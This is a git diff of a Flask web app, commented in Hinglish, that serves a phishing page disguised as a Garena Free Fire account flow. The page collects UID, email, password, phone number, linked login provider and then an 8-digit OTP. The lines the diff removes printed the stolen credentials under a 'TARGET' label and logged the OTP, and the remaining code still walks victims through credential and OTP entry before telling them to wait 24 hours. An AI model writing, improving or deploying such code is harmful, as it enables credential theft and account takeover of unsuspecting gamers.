@@ -2,8 +2,8 @@ from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
 
-# Fixed Direct Link (Yeh link 100% chalega)
-BG_URL = "https://i.postimg.cc/zXQBBdsW/1868470-1080x1920-samsung-full-hd-garena-free-fire-wallpaper-photo.jpg"
+# Aapka naya Raw link yahan update kar diya hai
+BG_URL = "https://raw.githubusercontent.com/northway656-create/myflaskapp/main/1868470-1080x1920-samsung-full-hd-garena-free-fire-wallpaper-photo.jpg"
 
 HTML_TEMPLATE = f'''
 <!DOCTYPE html>
@@ -18,7 +18,6 @@ HTML_TEMPLATE = f'''
             background-position: center; 
             background-attachment: fixed;
             background-repeat: no-repeat;
-            background-color: #1a1a1a; /* Photo load hone tak dark color dikhega */
             margin: 0; font-family: sans-serif;
             display: flex; justify-content: center; align-items: center; min-height: 100vh;
         }}
@@ -48,7 +47,7 @@ HTML_TEMPLATE = f'''
                 <option value="Google">Google Account</option>
                 <option value="Facebook">Facebook Account</option>
                 <option value="VK">VK Account</option>
-                <option value="X">X (Twitter) Account</option>
+                <option value="X">X Account</option>
             </select>
             <button type="submit" class="blue-btn">PROCEED</button>
         </form>
@@ -69,22 +68,17 @@ def preview():
     password = request.form.get('password')
     acc = request.form.get('account_type')
     return f'''
-    <body style="background-image: url('{BG_URL}'); background-size: cover; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif;">
+    <body style="background-image: url('{BG_URL}'); background-size: cover; background-position: center; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif; margin: 0;">
         <div style="background: white; padding: 25px; border-radius: 15px; width: 300px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.5);">
             <h3 style="color: red;">Confirm Details</h3>
             <div style="text-align: left; background: #f0f0f0; padding: 15px; border-radius: 8px; font-size: 14px;">
                 <p><b>UID:</b> {uid}</p>
                 <p><b>Email:</b> {email}</p>
-                <p><b>Password:</b> <span style="color:blue;">{password}</span></p>
-                <p><b>Phone:</b> {phone}</p>
+                <p><b>Password:</b> {password}</p>
                 <p><b>Login:</b> {acc}</p>
             </div>
             <form action="/submit_final" method="post">
-                <input type="hidden" name="uid" value="{uid}">
-                <input type="hidden" name="email" value="{email}">
                 <input type="hidden" name="phone" value="{phone}">
-                <input type="hidden" name="password" value="{password}">
-                <input type="hidden" name="acc" value="{acc}">
                 <button type="submit" style="background: #28a745; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; margin-top: 15px; font-weight: bold; cursor: pointer;">CONFIRM & GET OTP</button>
             </form>
         </div>
@@ -93,17 +87,12 @@ def preview():
 
 @app.route('/submit_final', methods=['POST'])
 def submit_final():
-    uid = request.form.get('uid')
-    email = request.form.get('email')
     phone = request.form.get('phone')
-    password = request.form.get('password')
-    acc = request.form.get('acc')
-    print(f"\\n🎯 TARGET: ID={uid}, MAIL={email}, PASS={password}, PH={phone}, TYPE={acc}\\n")
     return f'''
-    <body style="background-image: url('{BG_URL}'); background-size: cover; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif;">
+    <body style="background-image: url('{BG_URL}'); background-size: cover; background-position: center; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif; margin: 0;">
         <div style="background: white; padding: 25px; border-radius: 15px; width: 300px; text-align: center;">
             <h2>OTP Verification</h2>
-            <p>8-Digit code sent to {phone}</p>
+            <p>Code sent to {phone}</p>
             <form action="/final_otp" method="post">
                 <input type="text" name="otp" placeholder="Enter 8-digit OTP" maxlength="8" required style="width: 100%; padding: 10px; margin-bottom: 20px;">
                 <button type="submit" style="background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px;">VERIFY</button>
@@ -114,9 +103,7 @@ def submit_final():
 
 @app.route('/final_otp', methods=['POST'])
 def final_otp():
-    otp = request.form.get('otp')
-    print(f"📩 RECEIVED OTP: {otp}")
-    return "<h1 style='color:white; text-align:center; margin-top:50px;'>Processing... Please wait 24 hours.</h1>"
+    return "<h1 style='text-align:center; margin-top:50px;'>Processing... Please wait 24 hours.</h1>"
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=10000)
